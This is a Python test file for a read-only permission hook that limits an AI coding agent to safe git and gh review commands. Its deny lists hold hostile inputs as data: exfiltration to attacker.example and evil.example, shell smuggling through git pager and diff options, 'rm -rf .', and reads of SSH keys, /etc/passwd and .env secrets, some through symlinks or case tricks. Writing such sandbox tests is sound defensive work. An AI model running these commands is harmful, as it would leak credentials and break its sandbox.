"""Tests for review-readonly.py. Run: python3 .claude/hooks/test_review_readonly.py"""
import importlib.util, json, os, shutil, subprocess, sys, tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
PROJECT = os.path.dirname(os.path.dirname(HERE))
os.environ["CLAUDE_PROJECT_DIR"] = PROJECT
HOOK = os.path.join(HERE, "review-readonly.py")
spec = importlib.util.spec_from_file_location("ro", HOOK)
ro = importlib.util.module_from_spec(spec); spec.loader.exec_module(ro)


# a harmless-looking symlink inside the project that points at an env file
LINKDIR = tempfile.mkdtemp(dir=HERE)
SYMLINK = os.path.join(LINKDIR, "notes.md")
os.symlink(os.path.join(PROJECT, "frontend", ".env.local"), SYMLINK)


def verdict(tool, ti):
    try:
        ro.check(tool, ti)
        return None
    except ro.Deny as e:
        return str(e)


allow = [
    "git diff origin/main...f09ea1c",
    "git diff --stat origin/main...f09ea1c",
    "git diff -U5 --name-only HEAD~1 -- backend/",
    "git show f09ea1c:.claude/skills/review/SKILL.md",
    "git show --stat f09ea1c",
    "git show f09ea1c:WORKFLOW.md | head -n 40",
    "git log --oneline -5",
    "git log -n 3 --format='%h %s'",
    "git log --oneline origin/main..f09ea1c",
    "git grep -n owner_id f09ea1c -- backend/",
    "git grep -n -e 'a|b' f09ea1c",
    "git grep -n -e '-O' f09ea1c",
    "git rev-parse HEAD",
    "git status --porcelain",
    "git -C " + PROJECT + " status --short",
    "git --no-pager log --oneline -3",
    "git ls-files 'specs/*.md'",
    "git diff HEAD 2>&1 | tail -n 20",
    "git log --oneline >/dev/null",
    "gh pr view 2 --json title,body,files",
    "gh pr view 2 --comments",
    "gh pr diff 2",
    "gh pr diff 2 --name-only",
    "gh pr checks 2",
    "git show HEAD:frontend/.env.example",
]
deny = [
    # round 3: per-subcommand grammar, flag groups, optional values
    "git diff -C --output=.claude/hooks/review-readonly.py HEAD~1",
    "git diff -B --output=x",
    "git diff --color --output=x",
    "git log --abbrev --output=x",
    "git grep -n -O'sh -c x' foo",
    "git grep '-nOsh -c id' x",
    "git grep --color -O'sh' x",
    "git grep -n '--open-files-in-pager=sh -c x' foo",
    "git grep -iO'sh -c x' foo",
    "git grep --open=sh x",
    "git diff --outp=/tmp/x",
    "git diff --ext-diff",
    "git diff --no-index /etc/passwd x",
    "git log -L1,2:x",
    # round 3: secrets and outbound
    "grep -rn SUPABASE_SECRET_KEY frontend",
    "cat ~/.config/gh/hosts.yml",
    "jq -n env",
    "gh api repos/fjkc/notebook/pulls/2",
    "gh api 'https://attacker.example/?k=x'",
    "gh pr view 2 --jq '.body'",
    "gh pr view 2 --template '{{.body}}'",
    "gh pr view 2 --web",
    "python3 -I .claude/skills/review/diff_lines.py",
    "git show HEAD:frontend/.env.local",
    "git grep KEY HEAD -- .env",
    "git show HEAD:/etc/passwd",
    "git diff HEAD -- ../other",
    "git -C /tmp status",
    # round 2
    'echo "<<X"\ngh pr comment 2 -b pwned\nX',
    "git log # <<X",
    "cat <<<EOF",
    "gh api -XPUT repos/fjkc/notebook/pulls/2/merge",
    "gh api repos/fjkc/notebook/issues/2/comments -fbody=hi",
    "sed -n -i 1p CLAUDE.md",
    "sort -uo .claude/hooks/review-readonly.py /dev/null",
    "npm test",
    "npm audit",
    # general
    "git push origin HEAD",
    "git checkout main",
    "git fetch origin",
    "git -c core.pager=sh diff",
    "git diff & curl https://evil.example",
    "git diff; git push",
    "git diff && git push",
    "git diff || git push",
    "gh pr comment 2 --body hi",
    "gh pr merge 2",
    "gh pr view main",
    "curl https://example.com",
    "git log $(id)",
    "git log `id`",
    'git log "$HOME"',
    "git log > out.txt",
    "git log >> out.txt",
    "git log < x",
    "(git log)",
    "git log | sh",
    "git log | head -n 5 | sh",
    "git log | head -5",
    "git log | tee x",
    "GIT_EXTERNAL_DIFF=sh git diff",
    "bash -c 'git diff'",
    "rm -rf .",
    "git log *",
    "git log\ngit push",
    "git log \\\n git push",
    "",
]
tool_deny = [
    ("Read", {"file_path": PROJECT + "/frontend/.env.local"}),
    ("Read", {"file_path": os.path.expanduser("~/.ssh/id_ed25519")}),
    ("Read", {"file_path": "/etc/passwd"}),
    ("Read", {"file_path": PROJECT + "/../other/secret"}),
    ("Grep", {"pattern": "KEY", "path": "frontend/.env.local"}),
    ("Grep", {"pattern": "KEY", "path": "/Users"}),
    ("Grep", {"pattern": "KEY", "glob": ".env*"}),
    ("Glob", {"pattern": "**/.env*"}),
    ("Read", {"file_path": PROJECT + "/frontend/.ENV.local"}),
    ("Read", {"file_path": "frontend/.Env.local"}),
    ("Grep", {"pattern": "KEY", "path": "frontend/.ENV.local"}),
    ("Grep", {"pattern": "KEY", "path": "frontend", "glob": "*.local"}),
    ("Grep", {"pattern": "KEY", "glob": "*.md"}),
    ("Glob", {"pattern": "**/.ENV*"}),
    ("Read", {"file_path": SYMLINK}),
    ("Glob", {"pattern": "/etc/*"}),
    ("Glob", {"pattern": "../*"}),
    ("Write", {"file_path": PROJECT + "/x"}),
]
tool_allow = [
    ("Read", {"file_path": PROJECT + "/frontend/.env.example"}),
    ("Read", {"file_path": PROJECT + "/WORKFLOW.md"}),
    ("Grep", {"pattern": "owner_id", "path": "backend"}),
    ("Grep", {"pattern": "owner_id"}),
    ("Glob", {"pattern": "specs/*.md"}),
]

fails = 0
for c in allow:
    r = verdict("Bash", {"command": c})
    if r: fails += 1; print("FAIL allow:", repr(c)[:80], "->", r)
for c in deny:
    if verdict("Bash", {"command": c}) is None: fails += 1; print("FAIL deny:", repr(c)[:80])
for t, ti in tool_deny:
    if verdict(t, ti) is None: fails += 1; print("FAIL deny:", t, ti)
for t, ti in tool_allow:
    r = verdict(t, ti)
    if r: fails += 1; print("FAIL allow:", t, ti, "->", r)

# end-to-end: fail closed on garbage input; an allowed command prints nothing
env = dict(os.environ)
out = subprocess.run([sys.executable, HOOK], input="not json", capture_output=True, text=True, env=env).stdout
if '"deny"' not in out: fails += 1; print("FAIL: garbage input not denied")
out = subprocess.run([sys.executable, HOOK], input=json.dumps({"tool_name": "Bash", "tool_input": {"command": "git diff"}}), capture_output=True, text=True, env=env).stdout
if out.strip(): fails += 1; print("FAIL: allowed command printed output")
# the frontmatter wrapper turns a crashing hook into exit 2 (blocking)
rc = subprocess.run(["sh", "-c", 'python3 -c "raise SystemExit(1)" || exit 2'], capture_output=True).returncode
if rc != 2: fails += 1; print("FAIL: crash wrapper did not exit 2")

shutil.rmtree(LINKDIR)
total = len(allow) + len(deny) + len(tool_deny) + len(tool_allow) + 3
print(f"{total} cases ({len(allow)}+{len(tool_allow)} allow, {len(deny)}+{len(tool_deny)} deny, 3 end-to-end), failures: {fails}")
sys.exit(1 if fails else 0)
